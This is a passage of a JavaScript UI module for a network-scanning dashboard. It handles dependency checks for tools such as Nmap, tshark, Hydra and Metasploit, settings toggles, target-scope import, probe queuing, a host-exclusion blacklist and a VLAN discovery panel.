import { elements, domUtils } from './ui.js';
import { api } from './api.js';
import { state } from './state.js';
import { createScanAllOrchestrator } from './scanAllOrchestrator.js';
import { ipRegex, expandCIDR } from '#shared/networkConstants.js';

// --- Utilities ---
function escapeHtml(unsafe) {
  if (unsafe == null) return '';
  return String(unsafe)
       .replace(/&/g, "&amp;")
       .replace(/</g, "&lt;")
       .replace(/>/g, "&gt;")
       .replace(/"/g, "&quot;")
       .replace(/'/g, "&#039;");
}

function fmtTime(ts) {
  if (!ts) return '—';
  const d = new Date(ts);
  return d.toLocaleTimeString([], { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
}

// --- Initialization ---
Promise.all([
  api.checkNmap(),
  api.settings.checkDependency('tshark'),
  api.settings.checkDependency('hydra'),
  api.settings.checkDependency('msfrpcd'),
  api.settings.checkDependency('smbclient'),
]).then(async ([isNmapInstalled, tsharkStatus, hydraStatus, msfrpcdStatus, smbclientStatus]) => {
  const isTsharkInstalled = tsharkStatus ? tsharkStatus.installed : false;
  const isHydraInstalled = hydraStatus ? hydraStatus.installed : false;
  const isMsfrpcdInstalled = msfrpcdStatus ? msfrpcdStatus.installed : false;
  const isSmbclientInstalled = smbclientStatus ? smbclientStatus.installed : false;
  state.isNmapInstalled = isNmapInstalled;
  state.isTsharkInstalled = isTsharkInstalled;
  state.isHydraInstalled = isHydraInstalled;
  state.isMsfrpcdInstalled = isMsfrpcdInstalled;
  state.isSmbclientInstalled = isSmbclientInstalled;

  // Show the Shares button when smbclient is installed
  if (isSmbclientInstalled) {
    document.querySelectorAll('.smbclient-only').forEach(el => { el.style.display = ''; });
  }

  if (isNmapInstalled) {
    state.nmapScripts = await api.getNmapScripts();
    console.log(`Loaded ${state.nmapScripts?.length || 0} native Nmap scripts from backend.`);
    // Reveal Nmap scan-all options
    document.querySelectorAll('.scan-all-option.nmap-only').forEach(el => {
      el.style.display = 'flex';
    });
  }
  
  const missing = [];
  if (!isNmapInstalled) missing.push({ name: 'Nmap', url: 'https://nmap.org/download.html' });
  if (!isTsharkInstalled) missing.push({ name: 'Tshark (Wireshark)', url: 'https://www.wireshark.org/download.html' });
  if (!isHydraInstalled) missing.push({ name: 'Hydra (THC-Hydra)', url: 'https://github.com/vanhauser-thc/thc-hydra' });
  if (!isMsfrpcdInstalled) missing.push({ name: 'Metasploit Framework (msfrpcd)', url: 'https://www.metasploit.com/download' });
  if (!isSmbclientInstalled) missing.push({ name: 'smbclient (Samba Tools)', url: 'https://www.samba.org/samba/download/' });
  
  if (missing.length > 0) {
    if (elements.nmapInstallBanner) {
      const bannerTextContainer = elements.nmapInstallBanner.querySelector('.banner-text');
      if (bannerTextContainer) {
        bannerTextContainer.textContent = ''; // Clear previous
        missing.forEach((m, idx) => {
          if (idx > 0) bannerTextContainer.appendChild(document.createElement('br'));
          bannerTextContainer.appendChild(document.createTextNode(`${m.name} is missing. `));
          
          const link = document.createElement('a');
          link.href = m.url;
          link.target = '_blank';
          link.rel = 'noopener noreferrer';
          link.style.cssText = 'color: #000; text-decoration: underline; font-weight: 600; margin-left: 5px;';
          link.textContent = `Download ${m.name}`;
          bannerTextContainer.appendChild(link);
        });
      }
      elements.nmapInstallBanner.style.display = 'block';
    }
  }
});

if (elements.btnCloseNmapBanner) {
  elements.btnCloseNmapBanner.addEventListener('click', () => {
    if (elements.nmapInstallBanner) elements.nmapInstallBanner.style.display = 'none';
  });
}

// --- Settings Modal Logic ---
const btnSettings = document.getElementById('btn-settings');
const settingsModalOverlay = document.getElementById('settings-modal-overlay');
const btnCloseSettingsModal = document.getElementById('btn-close-settings-modal');
const btnSettingsDone = document.getElementById('btn-settings-done');

// Settings DOM elements
const toggleNmap = document.getElementById('setting-nmap-enabled');
const statusNmap = document.getElementById('status-nmap');
const toggleTshark = document.getElementById('setting-tshark-enabled');
const statusTshark = document.getElementById('status-tshark');
const toggleHydra = document.getElementById('setting-hydra-enabled');
const statusHydra = document.getElementById('status-hydra');
const toggleMsfrpcd = document.getElementById('setting-msfrpcd-enabled');
const statusMsfrpcd = document.getElementById('status-msfrpcd');
const toggleSmbclient = document.getElementById('setting-smbclient-enabled');
const statusSmbclient = document.getElementById('status-smbclient');
const toggleShowmount = document.getElementById('setting-showmount-enabled');
const statusShowmount = document.getElementById('status-showmount');

// VLAN Discovery DOM elements
const btnToggleVlanPanel = document.getElementById('btn-toggle-vlan-panel');
const vlanPanel = document.getElementById('vlan-panel');
const btnCloseVlanPanel = document.getElementById('btn-close-vlan-panel');
const vlanInterfaceSelect = document.getElementById('vlan-interface-select');
const btnRefreshVlanInterfaces = document.getElementById('btn-refresh-vlan-interfaces');
const btnStartVlanCapture = document.getElementById('btn-start-vlan-capture');
const vlanCountSpan = document.getElementById('vlan-count');
const vlanResultsContainer = document.getElementById('vlan-results-container');
const vlanEmptyState = document.getElementById('vlan-empty-state');

// --- Settings & Panel Helpers ---
async function syncDependencyToggle({
  checkFn,
  installedText,
  missingText,
  statusEl,
  settingsKey,
  toggleEl,
}) {
  const { installed } = await checkFn();
  const statusText = statusEl.querySelector('.status-text');
  
  statusEl.classList.toggle('installed', installed);
  statusEl.classList.toggle('missing', !installed);
  if (statusText) {
    statusText.textContent = installed ? installedText : missingText;
  }

  const settings = await api.settings.getAll();
  const enabled = settings[settingsKey]?.enabled !== false;

  toggleEl.checked = enabled;
  if (!installed && enabled) {
    toggleEl.checked = false;
    toggleEl.disabled = true;
    await api.settings.set(`${settingsKey}.enabled`, false);
  }

  return { installed, enabled };
}

function formatHostMonitorAlert(latestAlert, host) {
  const parts = [];
  const myNew    = latestAlert.changedHosts?.find(c => c.ip === host.ip);
  const myRemove = latestAlert.removedHosts?.find(r => r.ip === host.ip);
  const myNew2   = latestAlert.newHosts?.find(n => n.ip === host.ip);

  if (myNew2)   parts.push('New host detected');
  if (myRemove) parts.push('Host disappeared');
  if (myNew?.newPorts?.length)    parts.push(`+ports ${myNew.newPorts.join(', ')}`);
  if (myNew?.closedPorts?.length) parts.push(`-ports ${myNew.closedPorts.join(', ')}`);
  if (myNew?.hostnameChanged) {
    parts.push(
      `Hostname: ${escapeHtml(myNew.prevHostname)} → ${escapeHtml(myNew.currHostname)}`
    );
  }
  return parts.join(' · ') || 'Change detected';
}

function buildHostMonitorAlertSummary(host) {
  if (!host.monitorAlerts?.length) return null;
  const latestAlert = host.monitorAlerts[host.monitorAlerts.length - 1];

  const text = formatHostMonitorAlert(latestAlert, host);
  const alertDiv = document.createElement('div');
  alertDiv.className = `dp-monitor-alert alert-${latestAlert.severity || 'info'}`;
  alertDiv.textContent = text;
  return alertDiv;
}

function buildHostMonitorActions(host, monSection, subnetGuess) {
  const actionRow = document.createElement('div');
  actionRow.style.cssText = 'display:flex; gap:6px; flex-wrap:wrap; margin-top:8px;';

  const btnOpenMonitor = document.createElement('button');
  btnOpenMonitor.className = 'btn-action';
  btnOpenMonitor.style.cssText = 'font-size:10px; padding:3px 8px; border-color:var(--hardening); color:var(--hardening);';
  btnOpenMonitor.textContent = '🛡 Open Monitor Panel';
  btnOpenMonitor.addEventListener('click', () => {
    if (window.__openHardeningPanel) window.__openHardeningPanel(subnetGuess);
  });
  actionRow.appendChild(btnOpenMonitor);

  const btnMonitorSubnet = document.createElement('button');
  btnMonitorSubnet.className = 'btn-action';
  btnMonitorSubnet.style.cssText = 'font-size:10px; padding:3px 8px;';
  btnMonitorSubnet.textContent = `▶ Monitor ${subnetGuess}`;
  btnMonitorSubnet.addEventListener('click', async () => {
    if (window.__openHardeningPanel) window.__openHardeningPanel(subnetGuess);
    // Auto-start if not already running
    try {
      await api.hardeningMonitor.start(subnetGuess, { intervalMs: 15 * 60 * 1000, deepScan: true });
    } catch { /* ignore */ }
  });
  actionRow.appendChild(btnMonitorSubnet);

  if (host.monitorAlerts?.length > 0) {
    const btnClear = document.createElement('button');
    btnClear.className = 'btn-action';
    btnClear.style.cssText = 'font-size:10px; padding:3px 8px;';
    btnClear.textContent = '✓ Clear Alerts';
    btnClear.addEventListener('click', () => {
      const idx = state.hosts.findIndex(h => h.ip === host.ip);
      if (idx >= 0) {
        state.hosts[idx].monitorAlerts = [];
        host.monitorAlerts = [];
      }
      monSection.querySelector('.dp-monitor-alert')?.remove();
      const badgeContainer = document.getElementById(`host-${host.ip.replace(/\./g, '-')}`)?.querySelector('.security-badge-container');
      if (badgeContainer) {
        badgeContainer.innerHTML = '';
        updateSecurityBadgeDOM(host, badgeContainer);
      }
      btnClear.remove();
    });
    actionRow.appendChild(btnClear);
  }

  return actionRow;
}

function renderHardeningMonitorSection(host, portsParent) {
  const monSection = document.createElement('div');
  monSection.className = 'dp-monitor-section';

  const statusText = host.monitorStatus === 'online'  ? '🟢 Online'
                   : host.monitorStatus === 'offline' ? '💀 Offline'
                   : host.monitorStatus === 'changed' ? '🟡 Changed'
                   : '⚪ Not monitored';

  const lastSeenText = host.monitorLastSeen ? fmtTime(host.monitorLastSeen) : '—';
  const monPorts = host.ports?.length > 0 && host.monitorStatus
    ? host.ports.join(', ')
    : '—';

  const subnetGuess = host.ip.split('.').slice(0, 3).join('.') + '.0/24';

  const labelDiv = document.createElement('div');
  labelDiv.className = 'dp-section-label';
  labelDiv.textContent = '🛡 Hardening Monitor';
  monSection.appendChild(labelDiv);
  
  const gridDiv = document.createElement('div');
  gridDiv.className = 'dp-monitor-grid';
  
  const addRow = (label, val, monospace=false) => {
    const lSpan = document.createElement('span');
    lSpan.className = 'label';
    lSpan.textContent = label;
    gridDiv.appendChild(lSpan);
    
    const vSpan = document.createElement('span');
    vSpan.className = 'value';
    if (monospace) vSpan.style.fontFamily = 'monospace';
    vSpan.textContent = val;
    gridDiv.appendChild(vSpan);
  };
  addRow('Status:', statusText);
  addRow('Last seen:', lastSeenText);
  addRow('Ports (monitor):', monPorts, true);
  
  monSection.appendChild(gridDiv);

  const alertDiv = buildHostMonitorAlertSummary(host);
  if (alertDiv) monSection.appendChild(alertDiv);

  const actionRow = buildHostMonitorActions(host, monSection, subnetGuess);
  monSection.appendChild(actionRow);

  portsParent.appendChild(monSection);
}

function openPanel(panelEl, sidebarResizerEl) {
  panelEl.style.display = 'flex';
  setTimeout(() => panelEl.classList.add('open'), 10);
  if (sidebarResizerEl) sidebarResizerEl.style.display = 'block';
}

function closePanel(panelEl, sidebarResizerEl) {
  panelEl.classList.remove('open');
  setTimeout(() => {
    panelEl.style.display = 'none';
    if (sidebarResizerEl) sidebarResizerEl.style.display = 'none';
  }, 300);
}

async function loadAndApplySettings() {
  const settings = await api.settings.getAll();
  
  await syncDependencyToggle({
    checkFn: async () => ({ installed: await api.checkNmap() }),
    installedText: 'Installed',
    missingText: 'Not Found inside PATH',
    statusEl: statusNmap,
    settingsKey: 'nmap',
    toggleEl: toggleNmap,
  });

  await syncDependencyToggle({
    checkFn: () => api.settings.checkDependency('tshark'),
    installedText: 'Installed',
    missingText: 'Not Found inside PATH',
    statusEl: statusTshark,
    settingsKey: 'tshark',
    toggleEl: toggleTshark,
  });

  await syncDependencyToggle({
    checkFn: () => api.settings.checkDependency('hydra'),
    installedText: 'Installed',
    missingText: 'Not Found — Install THC-Hydra',
    statusEl: statusHydra,
    settingsKey: 'hydra',
    toggleEl: toggleHydra,
  });

  await syncDependencyToggle({
    checkFn: () => api.settings.checkDependency('msfrpcd'),
    installedText: 'Installed',
    missingText: 'Not Found — Install Metasploit Framework',
    statusEl: statusMsfrpcd,
    settingsKey: 'msfrpcd',
    toggleEl: toggleMsfrpcd,
  });

  await syncDependencyToggle({
    checkFn: () => api.settings.checkDependency('smbclient'),
    installedText: 'Installed',
    missingText: 'Not Found — Install samba-client (Linux/macOS) or Samba (Windows)',
    statusEl: statusSmbclient,
    settingsKey: 'smbclient',
    toggleEl: toggleSmbclient,
  });

  await syncDependencyToggle({
    checkFn: () => api.settings.checkDependency('showmount'),
    installedText: 'Installed',
    missingText: 'Not Found — Install nfs-common (Linux) or use built-in (macOS)',
    statusEl: statusShowmount,
    settingsKey: 'showmount',
    toggleEl: toggleShowmount,
  });

  applySettingsUI(settings);
}

function applySettingsUI(settings) {
  // Hide/Show Nmap UI components globally
  const nmapEnabled = settings.nmap?.enabled !== false;
  document.querySelectorAll('.nmap-only').forEach(el => {
    el.style.display = nmapEnabled ? 'flex' : 'none';
  });

  // Hide/Show Tshark UI components globally
  const tsharkEnabled = settings.tshark?.enabled !== false;
  document.querySelectorAll('.tshark-only').forEach(el => {
    el.style.display = tsharkEnabled ? 'flex' : 'none';
  });

  if (!tsharkEnabled && vlanPanel) {
     vlanPanel.classList.remove('open');
     vlanPanel.style.display = 'none';
     if (!elements.detailsPanel.classList.contains('open')) {
        elements.sidebarResizer.style.display = 'none';
     }
  }

  // Hide/Show Hydra UI components globally
  const hydraEnabled = settings.hydra?.enabled !== false;
  document.querySelectorAll('.hydra-only').forEach(el => {
    el.style.display = hydraEnabled ? 'flex' : 'none';
  });

  // Hide/Show Metasploit UI components globally
  const msfrpcdEnabled = settings.msfrpcd?.enabled !== false;
  document.querySelectorAll('.msfrpcd-only').forEach(el => {
    el.style.display = msfrpcdEnabled ? 'flex' : 'none';
  });

  // Hide/Show smbclient UI components globally
  const smbclientEnabled = settings.smbclient?.enabled !== false;
  document.querySelectorAll('.smbclient-only').forEach(el => {
    el.style.display = smbclientEnabled ? '' : 'none';
  });
}

toggleNmap.addEventListener('change', async (e) => {
  await api.settings.set('nmap.enabled', e.target.checked);
  const settings = await api.settings.getAll();
  applySettingsUI(settings);
});

toggleTshark.addEventListener('change', async (e) => {
  await api.settings.set('tshark.enabled', e.target.checked);
  const settings = await api.settings.getAll();
  applySettingsUI(settings);
});

toggleHydra.addEventListener('change', async (e) => {
  await api.settings.set('hydra.enabled', e.target.checked);
  const settings = await api.settings.getAll();
  applySettingsUI(settings);
});

toggleMsfrpcd.addEventListener('change', async (e) => {
  await api.settings.set('msfrpcd.enabled', e.target.checked);
  const settings = await api.settings.getAll();
  applySettingsUI(settings);
});

toggleSmbclient?.addEventListener('change', async (e) => {
  await api.settings.set('smbclient.enabled', e.target.checked);
  const settings = await api.settings.getAll();
  applySettingsUI(settings);
});

toggleShowmount?.addEventListener('change', async (e) => {
  await api.settings.set('showmount.enabled', e.target.checked);
});


btnSettings.addEventListener('click', () => {
  loadAndApplySettings();
  settingsModalOverlay.classList.remove('hidden');
});

btnCloseSettingsModal.addEventListener('click', () => {
  settingsModalOverlay.classList.add('hidden');
});

btnSettingsDone.addEventListener('click', () => {
  settingsModalOverlay.classList.add('hidden');
});

// Run once on boot
loadAndApplySettings();

// --- View Toggles ---
elements.btnViewGrid.addEventListener('click', () => { state.currentView = 'grid'; domUtils.applyViewStyle(state); });
elements.btnViewList.addEventListener('click', () => { state.currentView = 'list'; domUtils.applyViewStyle(state); });
elements.btnViewTable.addEventListener('click', () => { state.currentView = 'table'; domUtils.applyViewStyle(state); });
elements.btnViewTopology.addEventListener('click', () => { 
  state.currentView = 'topology'; 
  domUtils.applyViewStyle(state); 
  import('./topology.js').then(m => m.updateTopologyData(state.hosts));
});

document.addEventListener('open-host-details', (e) => {
  const ip = e.detail;
  const host = state.hosts.find(h => h.ip === ip);
  if (host) openDetailsPanel(host);
});

async function initInterfaces() {
  try {
    const interfaces = await api.getInterfaces();
    elements.interfaceSelect.innerHTML = '';
    
    if (interfaces.length === 0) {
      const opt = document.createElement('option');
      opt.value = '';
      opt.textContent = 'No interfaces found';
      elements.interfaceSelect.appendChild(opt);
      return;
    }

    interfaces.forEach(iface => {
      const opt = document.createElement('option');
      opt.value = iface.subnet;
      opt.textContent = iface.label;
      elements.interfaceSelect.appendChild(opt);
    });

    elements.interfaceSelect.disabled = false;
    elements.btnScan.disabled = false;
  } catch (e) {
    console.error('Failed to load interfaces:', e);
    elements.interfaceSelect.innerHTML = '<option value="">Error loading</option>';
  }
}

initInterfaces();

const passiveInterfaceSelect = document.getElementById('passive-interface-select');
const btnRefreshPassiveInterfaces = document.getElementById('btn-refresh-passive-interfaces');

async function initPassiveInterfaces() {
  if (!passiveInterfaceSelect) return;
  try {
    const interfaces = await api.getInterfaces();
    passiveInterfaceSelect.innerHTML = '';
    
    if (interfaces.length === 0) {
      const opt = document.createElement('option');
      opt.value = '';
      opt.textContent = 'No interfaces found';
      passiveInterfaceSelect.appendChild(opt);
      return;
    }

    interfaces.forEach(iface => {
      const opt = document.createElement('option');
      opt.value = iface.subnet;
      opt.dataset.name = iface.name; // Store the physical interface name for tshark
      opt.textContent = iface.label;
      passiveInterfaceSelect.appendChild(opt);
    });
  } catch (e) {
    console.error('Failed to load passive interfaces:', e);
    passiveInterfaceSelect.innerHTML = '<option value="">Error loading</option>';
  }
}

initPassiveInterfaces();

if (btnRefreshPassiveInterfaces) {
  btnRefreshPassiveInterfaces.addEventListener('click', () => {
    passiveInterfaceSelect.innerHTML = '<option value="">Refreshing...</option>';
    initPassiveInterfaces();
  });
}

elements.btnRefreshInterfaces.addEventListener('click', () => {
  elements.interfaceSelect.innerHTML = '<option value="">Refreshing...</option>';
  elements.interfaceSelect.disabled = true;
  elements.btnScan.disabled = true;
  initInterfaces();
});

// =============================================
// === TARGET SCOPE MANAGEMENT MODULE ===
// =============================================

let discoverHostCount = 0; // Tracks hosts found during current modal discover session

function openScopeModal() {
  state.pendingHosts = [];
  discoverHostCount = 0;
  elements.scopeModalOverlay.classList.remove('hidden');
  updatePendingCount();
  // Clear previous pending lists
  ['discover-pending-list', 'manual-pending-list', 'import-file-pending-list', 'import-nmap-pending-list'].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.innerHTML = '';
  });
  ['import-file-status', 'import-nmap-status', 'discover-status'].forEach(id => {
    const el = document.getElementById(id);
    if (el) { el.textContent = ''; el.className = el.id === 'discover-status' ? 'discover-status' : 'import-status'; }
  });
  // Reset manual form
  const manualIp = document.getElementById('manual-ip');
  const manualHostname = document.getElementById('manual-hostname');
  const manualMac = document.getElementById('manual-mac');
  if (manualIp) manualIp.value = '';
  if (manualHostname) manualHostname.value = '';
  if (manualMac) manualMac.value = '';
}

function closeScopeModal() {
  elements.scopeModalOverlay.classList.add('hidden');
  state.pendingHosts = [];
}

function setScopeCommitState({ staged, discovered }) {
  const total = staged + discovered;
  if (discovered > 0 && staged === 0) {
    // Discover-only: hosts are already live on dashboard
    elements.scopePendingCount.textContent = `${discovered} host${discovered !== 1 ? 's' : ''} discovered (added live)`;
    elements.btnScopeCommit.disabled = false;
    elements.btnScopeCommit.innerHTML = '<span class="icon">✅</span> Done';
    return;
  }

  if (total > 0) {
    const parts = [];
    if (staged > 0) parts.push(`${staged} staged`);
    if (discovered > 0) parts.push(`${discovered} discovered`);
    elements.scopePendingCount.textContent = `${total} host${total !== 1 ? 's' : ''} (${parts.join(', ')})`;
    elements.btnScopeCommit.disabled = false;
    elements.btnScopeCommit.innerHTML = staged > 0 
      ? '<span class="icon">✅</span> Add to Dashboard'
      : '<span class="icon">✅</span> Done';
  } else {
    elements.scopePendingCount.textContent = '0 hosts staged';
    elements.btnScopeCommit.disabled = true;
    elements.btnScopeCommit.innerHTML = '<span class="icon">✅</span> Add to Dashboard';
  }
}

function updatePendingCount() {
  const staged = state.pendingHosts.length;
  const discovered = discoverHostCount;
  setScopeCommitState({ staged, discovered });
}

function addPendingHost(host, listElId) {
  // Deduplicate by IP
  if (state.pendingHosts.some(h => h.ip === host.ip)) return;
  state.pendingHosts.push(host);
  updatePendingCount();
  renderPendingItem(host, listElId);
}

function renderPendingItem(host, listElId) {
  const listEl = document.getElementById(listElId);
  if (!listEl) return;
  const item = document.createElement('div');
  item.className = 'pending-host-item';
  item.setAttribute('data-ip', host.ip);

  const infoSpan = document.createElement('span');
  const ipSpan = document.createElement('span');
  ipSpan.className = 'pending-ip';
  ipSpan.textContent = host.ip;
  infoSpan.appendChild(ipSpan);

  if (host.hostname) {
    const metaSpan = document.createElement('span');
    metaSpan.className = 'pending-meta';
    metaSpan.textContent = host.hostname;
    infoSpan.appendChild(metaSpan);
  }
  if (host.os) {
    const osSpan = document.createElement('span');
    osSpan.className = 'pending-meta';
    osSpan.textContent = `| ${host.os}`;
    infoSpan.appendChild(osSpan);
  }

  const removeBtn = document.createElement('button');
  removeBtn.className = 'btn-remove-pending';
  removeBtn.textContent = '✕';
  removeBtn.addEventListener('click', () => {
    state.pendingHosts = state.pendingHosts.filter(h => h.ip !== host.ip);
    item.remove();
    updatePendingCount();
  });

  item.appendChild(infoSpan);
  item.appendChild(removeBtn);
  listEl.appendChild(item);
}

// Tab switching
document.querySelectorAll('.modal-tab').forEach(tab => {
  tab.addEventListener('click', () => {
    document.querySelectorAll('.modal-tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
    tab.classList.add('active');
    const pane = document.getElementById(`tab-${tab.getAttribute('data-tab')}`);
    if (pane) pane.classList.add('active');
  });
});

// Open/Close scope modal
elements.btnAddHosts.addEventListener('click', openScopeModal);
if (elements.btnAddHostsCta) elements.btnAddHostsCta.addEventListener('click', openScopeModal);
elements.btnCloseScopeModal.addEventListener('click', closeScopeModal);
elements.btnScopeCancel.addEventListener('click', closeScopeModal);

// Queue for Probe Host
const probeQueue = [];
let activeProbes = 0;
const MAX_CONCURRENT_PROBES = 10;

function pumpProbeQueue() {
  while (activeProbes < MAX_CONCURRENT_PROBES && probeQueue.length > 0) {
    const { ip, validIps, completedObj } = probeQueue.shift();
    activeProbes++;
    api.probeHost(ip).then(result => {
      activeProbes--;
      completedObj.count++;
      if (!result || result.error) {
        elements.statusText.innerText = `Probed ${completedObj.count}/${validIps.length} hosts...`;
      } else {
        // Update state with enriched data
        const hostIdx = state.hosts.findIndex(h => h.ip === ip);
        if (hostIdx >= 0) {
          const host = state.hosts[hostIdx];
          if (result.hostname && result.hostname !== 'Unknown') host.hostname = result.hostname;
          if (result.mac) host.mac = result.mac;
          if (result.vendor && result.vendor !== 'Unknown') host.vendor = result.vendor;
          if (result.os && result.os !== 'Unknown OS') host.os = result.os;
          if (result.ports && result.ports.length > 0) host.ports = result.ports;
        }
        // Update card DOM inline
        const card = document.getElementById(`host-${ip.replace(/\\./g, '-')}`);
        if (card) {
          const indicator = card.querySelector('.status-indicator');
          if (indicator) {
            indicator.classList.remove('checking');
            indicator.classList.add(result.alive ? 'online' : 'offline');
            indicator.title = result.alive ? `Online (${result.pingTime || '?'}ms)` : 'Offline / Unreachable';
          }
          const nameEl = card.querySelector('.host-name-display');
          if (nameEl && result.hostname) nameEl.textContent = result.hostname;
          const osEl = card.querySelector('.host-os-display');
          if (osEl && result.os) osEl.textContent = result.os;
          const vendorEl = card.querySelector('.host-vendor-display');
          if (vendorEl && result.vendor) vendorEl.textContent = result.vendor;
          const macEl = card.querySelector('.host-mac-display');
          if (macEl && result.mac) macEl.textContent = result.mac;
        }
      }
      
      if (completedObj.count >= validIps.length) {
        elements.statusText.innerText = `Probe complete. ${completedObj.count} host${completedObj.count !== 1 ? 's' : ''} enriched.`;
      } else {
        elements.statusText.innerText = `Probing... ${completedObj.count}/${validIps.length} hosts complete.`;
      }
      pumpProbeQueue();
    }).catch(() => {
      activeProbes--;
      completedObj.count++;
      pumpProbeQueue();
    });
  }
}

// Commit pending hosts to dashboard
elements.btnScopeCommit.addEventListener('click', () => {
  const newHosts = [...state.pendingHosts];
  const hostsToProbe = [];
  newHosts.forEach(h => {
    const existingIdx = state.hosts.findIndex(existing => existing.ip === h.ip);
    if (existingIdx >= 0) {
      state.hosts[existingIdx] = { ...state.hosts[existingIdx], ...h };
    } else {
      state.hosts.push(h);
    }
    // Queue non-discovered hosts for auto-probe
    if (h.source && h.source !== 'discovered') {
      hostsToProbe.push(h.ip);
    }
  });
  elements.statusText.innerText = `Added ${newHosts.length} host${newHosts.length !== 1 ? 's' : ''} to scope.`;
  closeScopeModal();
  renderAllHosts();
  
  // Auto-probe each non-discovered host in the background
  if (hostsToProbe.length > 0) {
    const validIps = hostsToProbe.filter(ip => ipRegex.test(ip));
    if (validIps.length > 0) {
      elements.statusText.innerText = `Probing ${validIps.length} host${validIps.length !== 1 ? 's' : ''}...`;
      const completedObj = { count: 0 };
      validIps.forEach(ip => {
        probeQueue.push({ ip, validIps, completedObj });
      });
      pumpProbeQueue();
    }
  }
});

// --- Manual Entry Tab ---
// --- Manual Entry Tab ---

document.getElementById('btn-manual-add')?.addEventListener('click', () => {
  const ipInput = document.getElementById('manual-ip');
  const hostnameInput = document.getElementById('manual-hostname');
  const macInput = document.getElementById('manual-mac');
  const ipVal = ipInput.value.trim();
  if (!ipVal) { ipInput.focus(); return; }

  if (ipVal.includes('/')) {
    // CIDR: expand to individual IPs
    const expanded = expandCIDR(ipVal);
    if (expanded.length === 0) {
      ipInput.style.borderColor = 'var(--danger)';
      setTimeout(() => { ipInput.style.borderColor = ''; }, 2000);
      return;
    }
    expanded.forEach(ip => {
      addPendingHost({ ip, hostname: '', mac: '', vendor: '', os: '', source: 'manual' }, 'manual-pending-list');
    });
  } else {
    // Single host
    const host = {
      ip: ipVal,
      hostname: hostnameInput.value.trim() || '',
      mac: macInput.value.trim() || '',
      vendor: '',
      os: '',
      source: 'manual'
    };
    addPendingHost(host, 'manual-pending-list');
  }
  ipInput.value = '';
  hostnameInput.value = '';
  macInput.value = '';
  ipInput.focus();
});

// --- Import File Tab ---
document.getElementById('btn-browse-scope')?.addEventListener('click', async () => {
  const statusEl = document.getElementById('import-file-status');
  statusEl.textContent = 'Importing...';
  statusEl.className = 'import-status';
  const res = await api.importScopeFile();
  if (res.status === 'imported') {
    statusEl.textContent = `✅ Imported ${res.hosts.length} hosts from ${res.path.split(/[\\/]/).pop()}`;
    statusEl.className = 'import-status success';
    res.hosts.forEach(h => addPendingHost(h, 'import-file-pending-list'));
  } else if (res.status === 'error') {
    statusEl.textContent = `❌ Error: ${res.error}`;
    statusEl.className = 'import-status error';
  } else {
    statusEl.textContent = '';
    statusEl.className = 'import-status';
  }
});

// --- Import Nmap XML Tab ---
document.getElementById('btn-browse-nmap')?.addEventListener('click', async () => {
  const statusEl = document.getElementById('import-nmap-status');
  statusEl.textContent = 'Parsing XML...';
  statusEl.className = 'import-status';
  const res = await api.importNmapXml();
  if (res.status === 'imported') {
    statusEl.textContent = `✅ Parsed ${res.hosts.length} hosts from ${res.path.split(/[\\/]/).pop()}`;
    statusEl.className = 'import-status success';
    res.hosts.forEach(h => addPendingHost(h, 'import-nmap-pending-list'));
  } else if (res.status === 'error') {
    statusEl.textContent = `❌ Error: ${res.error}`;
    statusEl.className = 'import-status error';
  } else {
    statusEl.textContent = '';
    statusEl.className = 'import-status';
  }
});

// =============================================
// === BLACKLIST MANAGEMENT MODULE ===
// =============================================

function isBlacklisted(host) {
  if (state.blacklist.length === 0) return false;
  for (const entry of state.blacklist) {
    if (entry === host.ip) return true;
    if (host.mac && entry.toUpperCase() === host.mac.toUpperCase()) return true;
    // Simple CIDR match (basic check — match against expanded range is expensive, so just match prefix)
    if (entry.includes('/')) {
      const [net, bits] = entry.split('/');
      const prefix = parseInt(bits, 10);
      if (!isNaN(prefix) && prefix >= 8 && prefix <= 32) {
        const netParts = net.split('.').map(Number);
        const hostParts = host.ip.split('.').map(Number);
        if (netParts.length === 4 && hostParts.length === 4) {
          const netNum = ((netParts[0] << 24) | (netParts[1] << 16) | (netParts[2] << 8) | netParts[3]) >>> 0;
          const hostNum = ((hostParts[0] << 24) | (hostParts[1] << 16) | (hostParts[2] << 8) | hostParts[3]) >>> 0;
          const mask = (0xFFFFFFFF << (32 - prefix)) >>> 0;
          if ((netNum & mask) === (hostNum & mask)) return true;
        }
      }
    }
  }
  return false;
}

function renderBlacklistEntries() {
  elements.blacklistEntries.innerHTML = '';
  state.blacklist.forEach((entry, idx) => {
    const el = document.createElement('div');
    el.className = 'blacklist-entry';
    const label = document.createElement('span');
    label.textContent = `🚫 ${entry}`;
    const removeBtn = document.createElement('button');
    removeBtn.className = 'btn-remove-bl';
    removeBtn.textContent = '✕';
    removeBtn.addEventListener('click', () => {
      state.blacklist.splice(idx, 1);
      renderBlacklistEntries();
      renderAllHosts();
    });
    el.appendChild(label);
    el.appendChild(removeBtn);
    elements.blacklistEntries.appendChild(el);
  });
  elements.blacklistCount.textContent = `${state.blacklist.length} entr${state.blacklist.length !== 1 ? 'ies' : 'y'}`;
}

elements.btnBlacklist.addEventListener('click', () => {
  elements.blacklistModalOverlay.classList.remove('hidden');
  renderBlacklistEntries();
});

elements.btnCloseBlacklistModal.addEventListener('click', () => {
  elements.blacklistModalOverlay.classList.add('hidden');
});

elements.btnBlacklistDone.addEventListener('click', () => {
  elements.blacklistModalOverlay.classList.add('hidden');
  renderAllHosts();
});

elements.btnBlacklistAdd.addEventListener('click', () => {
  const val = elements.blacklistInput.value.trim();
  if (!val) return;
  if (state.blacklist.includes(val)) return;
  state.blacklist.push(val);
  elements.blacklistInput.value = '';
  renderBlacklistEntries();
});

// Allow Enter key in blacklist input
elements.blacklistInput.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') elements.btnBlacklistAdd.click();
});

// =============================================
// === VLAN DISCOVERY MODULE ===
// =============================================

let isVlanCapturing = false;
let vlanTagsDetected = new Set();

// --- VLAN Event Handlers ---

btnToggleVlanPanel.addEventListener('click', async () => {
  const isOpen = vlanPanel.classList.contains('open');

  if (!isOpen) {
    const resizer = document.getElementById('vlan-resizer');
    openPanel(vlanPanel, resizer);
    await refreshVlanInterfaces();
  } else {
    const resizer = document.getElementById('vlan-resizer');
    closePanel(vlanPanel, resizer);
  }
});

btnCloseVlanPanel.addEventListener('click', () => {
  closePanel(vlanPanel, elements.sidebarResizer);
});

btnRefreshVlanInterfaces.addEventListener('click', refreshVlanInterfaces);

btnStartVlanCapture.addEventListener('click', async () => {
